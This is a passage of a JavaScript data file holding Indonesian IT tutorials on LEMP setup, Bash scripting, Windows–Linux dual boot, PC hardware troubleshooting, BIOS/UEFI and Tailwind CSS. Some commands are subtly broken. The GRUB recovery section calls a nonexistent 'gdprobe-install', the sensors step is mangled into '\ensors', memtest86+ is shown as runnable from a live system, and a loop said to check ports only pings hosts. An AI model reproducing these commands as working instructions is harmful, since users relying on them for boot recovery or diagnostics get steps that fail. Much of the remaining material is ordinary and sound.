        "<p>Nginx tidak mengeksekusi PHP sendiri — ia meneruskan request ke <strong>PHP-FPM</strong> melalui socket. Pastikan pool konfigurasi menunjuk ke socket yang benar.</p>" +
        codeBlock(
          "bash",
          "# cek versi PHP & lokasi konfigurasi\nphp -v\nls /etc/php/*/fpm/pool.d/\n\n# umumnya sudah benar; pastikan listen = /run/php/php8.3-fpm.sock\ngrep -R \"^listen\" /etc/php/*/fpm/pool.d/www.conf\n\nsudo systemctl restart php8.3-fpm\nsudo systemctl enable php8.3-fpm"
        ) +
        '<h2 id="nginx-vhost">4. Virtual Host Nginx</h2>' +
        codeBlock(
          "bash",
          "sudo nano /etc/nginx/sites-available/app.conf"
        ) +
        codeBlock(
          "nginx",
          "server {\n    listen 80;\n    server_name app.example.com;\n\n    root /var/www/app/public;\n    index index.php index.html;\n\n    access_log /var/log/nginx/app.access.log;\n    error_log  /var/log/nginx/app.error.log;\n\n    location / {\n        try_files $uri $uri/ /index.php?$query_string;\n    }\n\n    # proxy request PHP ke PHP-FPM\n    location ~ \\.php$ {\n        include snippets/fastcgi-php.conf;\n        fastcgi_pass unix:/run/php/php8.3-fpm.sock;\n    }\n\n    # tolak akses file tersembunyi (.env, .git)\n    location ~ /\\. {\n        deny all;\n    }\n}"
        ) +
        codeBlock(
          "bash",
          "# aktifkan site & uji konfigurasi\nsudo ln -s /etc/nginx/sites-available/app.conf /etc/nginx/sites-enabled/\nsudo nginx -t\n# nginx: configuration file /etc/nginx/nginx.conf test is successful\nsudo systemctl reload nginx\n\n# buat direktori web & file tes\nsudo mkdir -p /var/www/app/public\nsudo tee /var/www/app/public/index.php <<'EOF'\n<?php phpinfo();\nEOF\nsudo chown -R www-data:www-data /var/www/app"
        ) +
        callout(
          "warning",
          "Jangan lupa arahkan DNS record <code>app.example.com</code> ke IP server. Tanpa itu, virtual host tidak akan cocok dan Nginx akan menjatuhkan request ke server default."
        ) +
        '<h2 id="hardening">5. Hardening Dasar</h2>' +
        "<ul>" +
        "<li>Aktifkan firewall: <code>sudo ufw allow OpenSSH &amp;&amp; sudo ufw allow 'Nginx Full' &amp;&amp; sudo ufw enable</code></li>" +
        "<li>Instal &amp; konfigurasi <strong>Certbot</strong> untuk HTTPS: <code>sudo apt install certbot python3-certbot-nginx &amp;&amp; sudo certbot --nginx -d app.example.com</code></li>" +
        "<li>Matikan <code>server_tokens</code> agar versi Nginx tidak bocor di header respons</li>" +
        "<li>Jangan simpan file <code>.env</code> di document root</li>" +
        "</ul>" +
        '<h2 id="verifikasi">6. Verifikasi</h2>' +
        codeBlock(
          "bash",
          "# cek status service\nsudo systemctl status nginx php8.3-fpm mysql\n\n# tes dari mesin lain\ncurl -I http://app.example.com/\n# HTTP/1.1 200 OK\n# Server: nginx/1.24.0\n\n# buka di browser\n# http://app.example.com/index.php  → halaman phpinfo()"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kunci LEMP adalah <strong>pemisahan peran</strong>: Nginx melayani static &amp; meneruskan PHP ke FPM, sementara MySQL menangani data. Dengan virtual host terpisah, satu server bisa menampung banyak aplikasi dengan konfigurasi masing-masing.</p>" +
        callout(
          "tip",
          "Gunakan tool manajemen seperti <strong>PHP Composer</strong> dan <strong>WP-CLI</strong> bila kamu mengembangkan aplikasi CMS — jauh lebih efisien daripada mengelola dependency secara manual.",
          "TIPS"
        ),
    },

    "linux-bash-scripting": {
      id: "linux-bash-scripting",
      crumb: "Bash Shell Scripting",
      title: "Automasi Perintah Linux Menggunakan Bash Shell Scripting",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Belajar menulis script Bash dari dasar: variabel, kondisi, perulangan, hingga membuat script backup dan monitoring yang benar-benar berguna.",
      date: "2026-10-01",
      readTime: 13,
      lab: "Ubuntu 22.04 + cron",
      author: "Admin KBHub",
      tags: ["bash", "scripting", "automasi", "linux"],
      content:
        '<h2 id="dasar">1. Struktur Dasar Script</h2>' +
        "<p>Setiap script Bash diawali <strong>shebang</strong> yang menunjukkan interpreter, lalu simpan dengan ekstensi <code>.sh</code> dan beri izin eksekusi.</p>" +
        codeBlock(
          "bash",
          "#!/bin/bash\n# script pertama saya\n echo \"Halo, dunia dari $(hostname)!\"\n\nchmod +x script.sh    # beri izin eksekusi\n./script.sh           # jalankan"
        ) +
        '<h2 id="variabel">2. Variabel &amp; Input Pengguna</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\nNAMA=\"KBHub\"\nthn=$(date +%Y)\necho \"Selamat datang di $NAMA (tahun $thn)\"\n\n# baca input dari user\nread -p \"Masukkan nama folder: \" folder\nmkdir -p \"$folder\"     # SELALU quote variabel!\necho \"Folder '$folder' dibuat.\""
        ) +
        callout(
          "warning",
          "Selalu bungkus variabel dengan tanda kutip (<code>\"$var\"</code>). Tanpa kutip, nilai berisi spasi akan terpecah menjadi beberapa argumen dan bisa memicu perintah yang salah sasaran — celah yang sering disalahkan pada script backup."
        ) +
        '<h2 id="kondisi">3. Percabangan (If / Case)</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\njumlah=$(df / | awk 'NR==2 {print $5}' | tr -d '%')\n\nif [ \"$jumlah\" -ge 90 ]; then\n  echo \"PERINGATAN: disk penuh ($jumlah%)\"\nelif [ \"$jumlah\" -ge 70 ]; then\n  echo \"WASPADA: disk mulai penuh ($jumlah%)\"\nelse\n  echo \"Aman: disk terpakai $jumlah%\"\nfi\n\n# case untuk switch sederhana\ncase \"$1\" in\n  start)   echo \"Service dijalankan\" ;;\n  stop)    echo \"Service dihentikan\" ;;\n  *)       echo \"Pakai: $0 {start|stop}\" ;;\nesac"
        ) +
        '<h2 id="loop">4. Perulangan (For / While)</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\n# cek port yang listening pada beberapa host\nfor host in 192.168.1.1 192.168.1.2 192.168.1.3; do\n  if ping -c 1 -W 1 \"$host\" >/dev/null 2>&1; then\n    echo \"$host : UP\"\n  else\n    echo \"$host : DOWN\"\n  fi\ndone\n\n# while: baca file baris per baris\nwhile IFS= read -r user; do\n  echo \"Memproses user: $user\"\ndone < daftar-user.txt"
        ) +
        '<h2 id="fungsi">5. Fungsi</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\nlog() {\n  echo \"[$(date '+%Y-%m-%d %H:%M:%S')] $1\"\n}\n\nlog \"Memulai proses...\"\nsleep 1\nlog \"Selesai.\"\n\n# fungsi dengan parameter\nhitung() {\n  echo \"Hasil: $(( $1 + $2 ))\"\n}\nhitung 10 25"
        ) +
        '<h2 id="script-backup">6. Studi Kasus: Script Backup Terjadwal</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\n# backup.sh — backup folder + kompres + rotasi\nset -euo pipefail\n\nSRC=\"/var/www/app\"\nDEST=\"/backup\"\nSTAMP=$(date +%Y%m%d-%H%M)\nFILE=\"$DEST/app-$STAMP.tar.gz\"\nKEEP=7   # simpan 7 backup terakhir\n\nmkdir -p \"$DEST\"\ntar -czf \"$FILE\" \"$SRC\"\n\necho \"Backup dibuat: $FILE ($(du -h \"$FILE\" | cut -f1))\"\n\n# rotasi: hapus backup lama\ncd \"$DEST\"\nls -1t app-*.tar.gz | tail -n +$((KEEP+1)) | xargs -r rm -f\n\necho \"Rotasi selesai, menyimpan $KEEP terakhir.\""
        ) +
        codeBlock(
          "bash",
          "# jadwalkan via cron (setiap jam 02:00)\ncrontab -e\n0 2 * * * /root/backup.sh >> /var/log/backup.log 2>&1\n\n# uji manual dulu sebelum dipasang cron\nsudo bash /root/backup.sh"
        ) +
        '<h2 id="debug">7. Debug &amp; Praktik Baik</h2>' +
        "<ul>" +
        "<li>Aktifkan <code>set -euo pipefail</code> agar script berhenti saat ada error</li>" +
        "<li>Gunakan <code>set -x</code> atau <code>bash -x script.sh</code> untuk melihat eksekusi per baris</li>" +
        "<li>Simpan pesan error ke <code>stderr</code> dengan <code>echo \"...\" &gt;&amp;2</code></li>" +
        "<li>Uji dengan <code>shellcheck script.sh</code> untuk menangkap kebiasaan buruk</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Bash scripting adalah jembatan antara <strong>menjalankan perintah satu per satu</strong> dan <strong>otomasi penuh</strong>. Fokus pada variabel yang di-quote, error handling dengan <code>set -e</code>, dan kebiasaan menguji sebelum menjadwalkan lewat cron.</p>" +
        callout(
          "tip",
          "Tantangan berikutnya: buat script monitoring yang mengirim notifikasi Telegram ketika penggunaan disk melebihi 80%, memakai <code>curl</code> ke Bot API.",
          "LATIHAN"
        ),
    },

    "itsupport-windows-reinstall-dualboot": {
      id: "itsupport-windows-reinstall-dualboot",
      crumb: "Dual Boot Windows 11 & Linux",
      title: "Panduan Dual Boot Windows 11 & Linux Tanpa Kehilangan Data",
      category: "itsupport",
      difficulty: "Intermediate",
      excerpt:
        "Langkah aman memasang dual boot Windows 11 bersama Linux: persiapan partisi, urutan instalasi yang benar, konfigurasi GRUB, dan pemulihan bila boot error.",
      date: "2026-09-25",
      readTime: 14,
      lab: "PC UEFI + SSD 512 GB",
      author: "Admin KBHub",
      tags: ["dual-boot", "windows", "linux", "grub"],
      content:
        callout(
          "warning",
          "<strong>Cadangkan semua data penting</strong> sebelum mempartisi disk. Salah partisi bisa menghapus Windows atau data kamu. Siapkan juga USB bootable dan pastikan laptop/PC dalam keadaan terisi daya penuh.",
          "PERINGATAN"
        ) +
        '<h2 id="konsep">1. Konsep Dual Boot</h2>' +
        "<p>Dual boot berarti <strong>satu disk, dua sistem operasi</strong>, dipilih saat komputer menyala lewat menu boot (GRUB/Windows Boot Manager). Berbeda dari virtualisasi, keduanya memakai hardware secara langsung sehingga performa maksimal.</p>" +
        '<h2 id="persiapan">2. Persiapan</h2>' +
        "<ul>" +
        "<li>Matikan <strong>Fast Startup</strong> di Windows (Control Panel → Power Options) agar partisi Windows tidak terkunci Linux</li>" +
        "<li>Matikan <strong>Secure Boot</strong> sementara bila distro yang dipakai belum mendukungnya</li>" +
        "<li>Buat USB bootable Linux dengan <strong>Rufus</strong> atau <strong>BalenaEtcher</strong></li>" +
        "<li>Defrag/optimasi drive Windows, lalu pastikan ada ≥ 50 GB ruang kosong untuk Linux</li>" +
        "</ul>" +
        '<h2 id="urutan">3. Urutan Instalasi yang Benar</h2>' +
        "<p><strong>Windows dulu, Linux kemudian.</strong> Linux akan mendeteksi Windows dan menambahkannya ke menu GRUB otomatis. Jika dibalik, Windows akan menimpa boot loader dan Linux jadi tidak muncul.</p>" +
        '<h2 id="partisi">4. Mempartisi Disk (dari Windows)</h2>' +
        codeBlock(
          "powershell",
          "# buka Disk Management (diskmgmt.msc)\n# 1. klik kanan volume Windows (C:) → Shrink Volume\n#    sisakan minimal 50000 MB (50 GB) untuk Linux\n# 2. hasilnya menjadi 'Unallocated Space' — JANGAN diformat\n# 3. catat partisi EFI (biasanya 100-260 MB, sistem GPT)\n\ndiskpart\nlist disk\nselect disk 0\nlist partition        # periksa partisi EFI & data"
        ) +
        callout(
          "note",
          "Biarkan ruang kosong <strong>unallocated</strong> — installer Linux (mis. Ubuntu) menyediakan opsi <em>\"Install alongside Windows\"</em> yang otomatis memakai ruang tersebut. Kamu tidak perlu membuat partisi manual kecuali ingin konfigurasi khusus."
        ) +
        '<h2 id="instalasi">5. Instalasi Linux</h2>' +
        "<ol>" +
        "<li>Boot dari USB (ubah boot order via <strong>F2/F12/DEL</strong>)</li>" +
        "<li>Pilih <em>Install Ubuntu</em> → tentukan bahasa, keyboard, dan koneksi Wi-Fi</li>" +
        "<li>Pada pilihan jenis instalasi, pilih <strong>Install alongside Windows Boot Manager</strong></li>" +
        "<li>Selesaikan proses instalasi hingga diminta restart</li>" +
        "</ol>" +
        '<h2 id="grub">6. Menu GRUB &amp; Boot Order</h2>' +
        codeBlock(
          "bash",
          "# setelah install, sistem harus boot ke GRUB\n# untuk memaksa update menu GRUB dari Linux:\nsudo update-grub\n# Generating grub configuration file ...\n#   found Windows Boot Manager on /dev/sda1\n\n# ubah urutan boot default (mis. default ke Windows)\nsudo nano /etc/default/grub\n#   GRUB_DEFAULT=2\n#   GRUB_TIMEOUT=10\nsudo update-grub"
        ) +
        '<h2 id="troubleshooting">7. Troubleshooting</h2>' +
        '<table><thead><tr><th>Masalah</th><th>Solusi</th></tr></thead><tbody>' +
        "<tr><td>Windows tidak muncul di GRUB</td><td>Jalankan <code>sudo os-prober &amp;&amp; sudo update-grub</code></td></tr>" +
        "<tr><td>Terjebak di <code>grub rescue</code></td><td><code>set prefix=(hd0,gpt1)/boot/grub</code> lalu <code>insmod normal &amp;&amp; normal</code></td></tr>" +
        "<tr><td>Jam Linux salah</td><td>Matikan Fast Startup, set <code>timedatectl set-local-rtc 1</code></td></tr>" +
        "<tr><td>Wi-Fi tidak jalan</td><td>Instal driver: <code>ubuntu-drivers autoinstall</code></td></tr>" +
        "<tr><td>Boot ke Windows malah error</td><td>Disable Fast Startup &amp; periksa partisi NTFS tidak corrupted</td></tr>" +
        "</tbody></table>" +
        '<h2 id="pemulihan-grub">8. Pemulihan GRUB dari Live USB</h2>' +
        "<p>Jika komputer tersangkut di <code>grub rescue</code> atau boot loader hilang, perbaiki dari Live USB. Kuncinya: mount partisi root &amp; EFI, lalu masuk <strong>chroot</strong> agar perintah dijalankan seolah Linux sudah terpasang.</p>" +
        codeBlock(
          "bash",
          "# boot dari Live USB Ubuntu, pilih 'Try Ubuntu'\n# 1. temukan partisi root Linux (mis. sda2) dan EFI (sda1)\nsudo fdisk -l\n\n# 2. mount partisi root lalu chroot\nsudo mount /dev/sda2 /mnt\nsudo mount --bind /dev  /mnt/dev\nsudo mount --bind /proc /mnt/proc\nsudo mount --bind /sys  /mnt/sys\nsudo mount /dev/sda1 /mnt/boot/efi   # partisi EFI\nsudo chroot /mnt\n\n# 3. pasang ulang GRUB ke EFI\ngdprobe-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=UBUNTU\n\n# 4. regenerate menu\nupdate-grub\n\n# 5. keluar, reboot, cabut USB\nexit\nsudo reboot"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kunci dual boot yang aman: <strong>backup → matikan Fast Startup → urutan Windows dulu, Linux kemudian → biarkan installer Linux menangani GRUB</strong>. Dengan urutan ini, risiko kehilangan data dan boot error bisa diminimalkan.</p>" +
        callout(
          "tip",
          "Ingin mencoba Linux tanpa risiko sama sekali? Gunakan mode <strong>Live USB</strong> dulu untuk mengetes kompatibilitas hardware sebelum memutuskan instalasi permanen.",
          "TIPS"
        ),
    },

    "itsupport-pc-troubleshooting": {
      id: "itsupport-pc-troubleshooting",
      crumb: "Troubleshooting Hardware PC",
      title: "Panduan Troubleshooting Hardware PC: RAM Unreadable, No Display, & Overheating",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Metode sistematis mendiagnosa masalah hardware PC: RAM tidak terbaca, layar hitam tanpa display, dan suhu berlebih — lengkap dengan alur diagnostik bertahap.",
      date: "2026-09-22",
      readTime: 12,
      lab: "PC Desktop / Workstation",
      author: "Admin KBHub",
      tags: ["hardware", "troubleshooting", "ram", "diagnostic"],
      content:
        '<h2 id="mindset">1. Mindset Diagnostik</h2>' +
        "<p>Triase hardware yang benar selalu mengikuti prinsip <strong>termurah &amp; termudah dulu</strong>: periksa kabel → power → komponen yang mudah dicabut → komponen inti. Jangan langsung mengganti part sebelum memastikan penyebabnya.</p>" +
        '<h2 id="ram">2. RAM Unreadable / Memory Error</h2>' +
        "<p>Gejala: PC menyala (fan berputar) tapi muncul beep code, atau Windows menampilkan <em>&quot;Your PC ran into a problem&quot;</em> / BSOD <code>MEMORY_MANAGEMENT</code>.</p>" +
        "<ol>" +
        "<li><strong>Cabut &amp; bersihkan RAM</strong> — lepas modul, bersihkan pin kuningan dengan penghapus karet, pasang kembali hingga klip terkunci</li>" +
        "<li><strong>Uji satu per satu</strong> — jika ada 2 stick, tes masing-masing secara terpisah pada slot yang sama untuk menemukan modul rusak</li>" +
        "<li><strong>Ganti slot</strong> — kadang slot DIMM yang bermasalah, bukan modulnya</li>" +
        "<li><strong>Jalankan diagnosa</strong> — gunakan tool memtest</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# uji RAM dari Linux (Live USB)\nsudo apt install memtest86+\nsudo memtest86+\n# biarkan minimal 1 siklus penuh tanpa error\n\n# alternatif cepat dari Windows PowerShell\nmdsched.exe            # pilih 'Restart now and check'\n\n# cek kapasitas terdeteksi\nwmic memorychip get capacity,speed,devicelocator"
        ) +
        '<h2 id="no-display">3. No Display (Layar Hitam)</h2>' +
        "<p>PC menyala tapi monitor tetap <em>No Signal</em>. Urutan cek:</p>" +
        '<table><thead><tr><th>Langkah</th><th>Tindakan</th></tr></thead><tbody>' +
        "<tr><td>1</td><td>Pastikan monitor menyala &amp; input source benar (HDMI/DP)</td></tr>" +
        "<tr><td>2</td><td>Cabut pasang kabel video, coba port/kabel lain</td></tr>" +
        "<tr><td>3</td><td>Dengarkan <strong>beep code</strong> — beep panjang = masalah RAM/GPU</td></tr>" +
        "<tr><td>4</td><td>Lepas GPU, tancapkan langsung ke port video onboard</td></tr>" +
        "<tr><td>5</td><td>Reset CMOS (jumper CLR_CMOS / cabut baterai BIOS 5 menit)</td></tr>" +
        "<tr><td>6</td><td>Uji PSU — cek tegangan 12V/5V/3.3V dengan multimeter atau PSU tester</td></tr>" +
        "</tbody></table>" +
        callout(
          "note",
          "Beep code adalah bahasa motherboard saat POST gagal. <strong>Satu beep pendek</strong> = normal (POST sukses). Pola berbeda antar merek — cek manual motherboard untuk arti pastinya (AMI, Award, ASUS)."
        ) +
        '<h2 id="overheating">4. Overheating</h2>' +
        "<p>Gejala: PC tiba-tiba <em>shutdown</em>, performa melambat (thermal throttling), atau suhu CPU di atas 90°C.</p>" +
        codeBlock(
          "bash",
          "# pantau suhu di Linux\nsudo apt install lm-sensors\ensors\nwatch -n1 sensors        # awasi suhu CPU & fan RPM\n\n# Windows: gunakan HWMonitor / Core Temp\n# standar aman saat idle: 30-50°C\n# beban penuh : di bawah 85-90°C"
        ) +
        "<ul>" +
        "<li>Bersihkan debu heatsink &amp; kipas dengan <strong>compressed air</strong></li>" +
        "<li>Ganti <strong>thermal paste</strong> yang sudah kering (disarankan tiap 2–3 tahun)</li>" +
        "<li>Pastikan aliran udara case benar: intake depan/bawah, exhaust belakang/atas</li>" +
        "<li>Jangan letakkan PC di permukaan lembut (karpet) yang menutup ventilasi</li>" +
        "</ul>" +
        '<h2 id="alur">5. Alur Diagnostik Ringkas</h2>' +
        codeBlock(
          "bash",
          "# ringkasan alur triase\n1. Power cek   → kabel, saklar PSU, koneksi panel depan\n2. POST cek    → dengar beep, LED debug motherboard\n3. Minimal PC  → cabut GPU, HDD, RAM berlebih (sisakan 1)\n4. Re-seat     → pasang ulang semua kabel & modul\n5. Swap uji    → ganti dengan part cadangan yang diketahui baik\n6. Docs        → catat gejala + kode error untuk riwayat"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Troubleshooting hardware bukan soal menebak, melainkan <strong>mempersempit kemungkinan secara sistematis</strong>. Catat setiap gejala, ubah satu variabel dalam satu kali uji, dan selalu mulai dari komponen yang paling mudah diakses.</p>" +
        callout(
          "tip",
          "Simpan satu modul RAM dan kabel video cadangan di meja kerja kamu. Komponen pengganti yang sudah diketahui baik adalah alat diagnostik paling cepat untuk membedakan 'part rusak' vs 'konfigurasi salah'.",
          "TIPS"
        ),
    },

    "itsupport-bios-uefi-guide": {
      id: "itsupport-bios-uefi-guide",
      crumb: "BIOS vs UEFI",
      title: "Memahami Perbedaan BIOS vs UEFI dan Cara Menyesuaikan Boot Priority",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Penjelasan lengkap perbedaan BIOS legacy dan UEFI modern, cara masuk ke pengaturan, mengubah boot priority, serta konsep Secure Boot dan GPT vs MBR.",
      date: "2026-09-15",
      readTime: 10,
      lab: "PC/Laptop UEFI (ASUS, Dell, Lenovo)",
      author: "Admin KBHub",
      tags: ["bios", "uefi", "boot", "firmware"],
      content:
        '<h2 id="perbedaan">1. Perbedaan BIOS dan UEFI</h2>' +
        "<p><strong>BIOS</strong> (Legacy) adalah firmware lama berbasis 16-bit, sementara <strong>UEFI</strong> adalah penerusnya yang 64-bit, mendukung antarmuka grafis, mouse, partisi besar, dan boot lebih cepat.</p>" +
        '<table><thead><tr><th>Aspek</th><th>BIOS Legacy</th><th>UEFI</th></tr></thead><tbody>' +
        "<tr><td>Partisi disk</td><td>MBR (maks 2 TB)</td><td>GPT (hingga 9 ZB)</td></tr>" +
        "<tr><td>Boot loader</td><td>16-bit real mode</td><td>64-bit, EFI System Partition</td></tr>" +
        "<tr><td>Antarmuka</td><td>Teks biru</td><td>Grafis + dukungan mouse</td></tr>" +
        "<tr><td>Boot time</td><td>Lebih lambat</td><td>Lebih cepat</td></tr>" +
        "<tr><td>Keamanan</td><td>Terbatas</td><td>Secure Boot, TPM</td></tr>" +
        "<tr><td>Partisi boot</td><td>1 partisi aktif</td><td>Banyak partisi boot</td></tr>" +
        "</tbody></table>" +
        '<h2 id="masuk">2. Cara Masuk ke BIOS/UEFI</h2>' +
        codeBlock(
          "bash",
          "# tekan saat komputer baru menyala (belum masuk OS):\n#   ASUS        : Del atau F2\n#   Dell        : F2\n#   Lenovo      : F2 atau Fn+F2\n#   HP          : Esc atau F10\n#   Acer        : F2 atau Del\n\n# DARI WINDOWS (tanpa menekan tombol cepat-cepat):\n#   Settings → System → Recovery → Advanced startup → Restart now\n#   Troubleshoot → Advanced → UEFI Firmware Settings → Restart\n\n# alternatif cepat via PowerShell\nshutdown /r /fw /t 0"
        ) +
        callout(
          "note",
          "Di Windows 11 dengan Fast Startup aktif, jendela menekan tombol BIOS bisa sangat sempit. Cara paling andal adalah masuk lewat <strong>Advanced startup</strong> seperti di atas."
        ) +
        '<h2 id="boot-priority">3. Mengubah Boot Priority</h2>' +
        "<ol>" +
        "<li>Masuk ke BIOS/UEFI (lihat langkah 2)</li>" +
        "<li>Cari tab <strong>Boot</strong> / <strong>Boot Menu</strong></li>" +
        "<li>Atur urutan: misal <em>USB Flash Drive</em> paling atas untuk instalasi, kembalikan ke <em>Windows Boot Manager</em> setelah selesai</li>" +
        "<li>Simpan dengan <strong>F10 → Save &amp; Exit</strong></li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# menu boot sekali jalan (tanpa mengubah setting permanen):\n#   Dell        : F12\n#   HP          : F9\n#   ASUS        : F8\n#   Lenovo      : F12\n# → pilih perangkat yang diinginkan langsung dari daftar"
        ) +
        '<h2 id="secure-boot">4. Secure Boot &amp; CSM</h2>' +
        "<ul>" +
        "<li><strong>Secure Boot</strong> hanya mengizinkan boot loader yang ter-sign — perlu <strong>dimatikan</strong> untuk instalasi distro Linux tertentu atau OS lama</li>" +
        "<li><strong>CSM (Compatibility Support Module)</strong> mengaktifkan mode legacy BIOS — matikan bila ingin UEFI penuh</li>" +
        "<li><strong>TPM 2.0</strong> wajib aktif untuk Windows 11</li>" +
        "</ul>" +
        callout(
          "warning",
          "Mengubah mode boot dari UEFI ke Legacy (atau sebaliknya) pada disk yang sudah terisi OS bisa membuat sistem <strong>tidak bisa boot sama sekali</strong>, karena format partisi (GPT vs MBR) tidak cocok. Hanya ubah setting ini saat benar-benar perlu dan paham konsekuensinya."
        ) +
        '<h2 id="verifikasi">5. Verifikasi Setelah Perubahan</h2>' +
        codeBlock(
          "powershell",
          "# di Windows, pastikan mode boot sesuai\nmsinfo32\n#   BIOS Mode            : UEFI\n#   Secure Boot State    : On\n\n# dari PowerShell\nConfirm-SecureBootUEFI   # True / False / pemanggilan tidak didukung"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Untuk penggunaan modern, <strong>UEFI + GPT + Secure Boot</strong> adalah standar yang disarankan — terutama untuk Windows 11. Pahami kapan harus mematikan Secure Boot dan CSM, dan selalu kembalikan prioritas boot ke hard disk setelah selesai instalasi agar komputer tidak tersendat menunggu USB yang tidak ada.</p>" +
        callout(
          "tip",
          "Catat konfigurasi BIOS sebelum mengubahnya (foto layar). Jika terjadi masalah, kamu bisa mengembalikan setting ke kondisi semula dengan cepat.",
          "TIPS"
        ),
    },

    "webdev-tailwind-responsive": {
      id: "webdev-tailwind-responsive",
      crumb: "Landing Page Tailwind Responsive",
      title: "Membuat Tampilan Landing Page Responsive Menggunakan Tailwind CSS",
      category: "webdev",
      difficulty: "Beginner",
      excerpt:
        "Praktik membangun landing page yang rapi di segala ukuran layar dengan Tailwind CSS: utility classes, breakpoint responsive, flex/grid, hingga komponen navbar & hero.",
      date: "2026-10-08",
      readTime: 12,
      lab: "VS Code + Browser Modern",
      author: "Admin KBHub",
      tags: ["tailwind", "css", "responsive", "landing-page"],
      content:
        '<h2 id="setup">1. Setup Tanpa Build</h2>' +
        "<p>Tailwind bisa dipakai langsung lewat CDN — cocok untuk belajar dan prototipe tanpa perlu Node.js atau konfigurasi bundler.</p>" +
        codeBlock(
          "html",
          "<!DOCTYPE html>\n<html lang=\"id\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Landing Page Responsive</title>\n  <script src=\"https://cdn.tailwindcss.com\"></script>\n</head>\n<body class=\"bg-slate-900 text-slate-100\">\n  <h1 class=\"text-3xl font-bold text-center py-10\">Halo Tailwind!</h1>\n</body>\n</html>"
        ) +
        '<h2 id="breakpoint">2. Sistem Breakpoint Responsive</h2>' +
        "<p>Tailwind memakai <strong>mobile-first</strong>: gaya dasar berlaku untuk layar kecil, lalu ditimpa oleh varian <code>md:</code>, <code>lg:</code>, <code>xl:</code> pada layar lebih besar.</p>" +
        '<table><thead><tr><th>Prefix</th><th>Min-width</th><th>Target</th></tr></thead><tbody>' +
        "<tr><td>(tanpa prefix)</td><td>0 px</td><td>Mobile</td></tr>" +
        "<tr><td><code>sm:</code></td><td>640 px</td><td>Layar besar ponsel</td></tr>" +
        "<tr><td><code>md:</code></td><td>768 px</td><td>Tablet</td></tr>" +
        "<tr><td><code>lg:</code></td><td>1024 px</td><td>Laptop</td></tr>" +
        "<tr><td><code>xl:</code></td><td>1280 px</td><td>Desktop</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "html",
          "<!-- teks kecil di mobile, besar di desktop -->\n<h1 class=\"text-2xl md:text-4xl lg:text-5xl font-extrabold\">\n  Judul yang Membesar Bertahap\n</h1>\n\n<!-- lebar penuh di mobile, 2 kolom di tablet -->\n<div class=\"grid grid-cols-1 md:grid-cols-2 gap-6\">\n  <div class=\"rounded-xl bg-slate-800 p-6\">Kartu A</div>\n  <div class=\"rounded-xl bg-slate-800 p-6\">Kartu B</div>\n</div>"
        ) +
        '<h2 id="navbar">3. Navbar Responsif</h2>' +
        codeBlock(
          "html",
          "<nav class=\"flex items-center justify-between px-6 py-4 bg-slate-800/80 backdrop-blur\">\n  <span class=\"text-xl font-bold\">Brand.</span>\n\n  <!-- menu langsung di desktop, tersembunyi di mobile -->\n  <div class=\"hidden md:flex gap-6 text-sm text-slate-300\">\n    <a href=\"#fitur\" class=\"hover:text-emerald-400\">Fitur</a>\n    <a href=\"#harga\" class=\"hover:text-emerald-400\">Harga</a>\n    <a href=\"#kontak\" class=\"hover:text-emerald-400\">Kontak</a>\n  </div>\n\n  <!-- tombol hamburger, hanya muncul di mobile -->\n  <button class=\"md:hidden text-2xl\" aria-label=\"Menu\">&#9776;</button>\n</nav>"
        ) +
        '<h2 id="hero">4. Section Hero</h2>' +
        codeBlock(
          "html",
          "<header class=\"min-h-[70vh] flex flex-col items-center justify-center text-center px-6\">\n  <span class=\"mb-4 rounded-full border border-emerald-500/30 bg-emerald-500/10 px-4 py-1 text-xs text-emerald-400\">\n    Versi 2.0 sudah rilis\n  </span>\n  <h1 class=\"max-w-3xl text-4xl font-extrabold leading-tight md:text-6xl\">\n    Bangun Antarmuka Lebih Cepat\n  </h1>\n  <p class=\"mt-4 max-w-xl text-slate-400 md:text-lg\">\n    Landing page responsif tanpa repot — cukup pilih utility class yang tepat.\n  </p>\n  <div class=\"mt-8 flex flex-col gap-3 sm:flex-row\">\n    <a href=\"#daftar\" class=\"rounded-lg bg-emerald-500 px-6 py-3 font-semibold text-slate-900 hover:bg-emerald-400\">Mulai Gratis</a>\n    <a href=\"#demo\" class=\"rounded-lg border border-slate-700 px-6 py-3 hover:border-slate-500\">Lihat Demo</a>\n  </div>\n</header>"
        ) +
        callout(
          "tip",
          "Perhatikan <code>flex-col sm:flex-row</code> pada tombol CTA — di mobile tombol menumpuk vertikal (lebih mudah disentuh), di layar lebar berdampingan. Inilah pola responsive paling sering dipakai."
        ) +
        '<h2 id="tips">5. Praktik Responsive yang Benar</h2>' +
        "<ul>" +
        "<li>Selalu tambahkan <code>&lt;meta name=\"viewport\"&gt;</code> — tanpa ini, mobile hanya mensimulasikan layar lebar</li>" +
        "<li>Uji dari kecil ke besar (<strong>mobile-first</strong>), bukan sebaliknya</li>" +
        "<li>Perhatikan area sentuh: minimal 44×44 px untuk tombol di mobile</li>" +
        "<li>Gunakan <code>space-y-*</code> atau <code>gap-*</code> alih-alih margin manual agar spasi konsisten</li>" +
        "<li>Cek gambar: pakai <code>max-w-full h-auto</code> agar tidak meluber dari container</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
